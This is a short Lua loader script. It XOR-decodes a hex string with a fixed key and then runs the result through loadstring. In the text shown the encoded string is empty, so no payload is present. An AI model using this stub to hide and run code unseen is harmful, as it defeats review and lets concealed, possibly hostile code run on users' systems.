local k={43,6,50,187,30,183,193,53,146,57,21,202,92,236,19,87,188,255,12,21,248,213,166,254,64,24,89,177,94,134,145,135}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
